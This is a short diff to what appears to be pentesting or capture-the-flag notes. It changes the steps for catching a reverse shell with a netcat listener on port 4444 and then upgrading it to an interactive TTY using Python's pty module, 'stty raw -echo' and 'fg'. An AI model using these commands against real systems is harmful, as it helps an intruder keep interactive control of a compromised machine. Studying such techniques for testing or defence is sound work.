@@ -3,8 +3,9 @@
 rlwrap nc -lvnp 4444
 
 # Remote.
+export TERM=xterm-color
 dpkg -l | grep python
 python -c "import pty;pty.spawn('/bin/bash')"
-stty raw -echo
-export TERM=xterm-color
+# After ctrl+z,
+stty raw -echo; fg
 ```
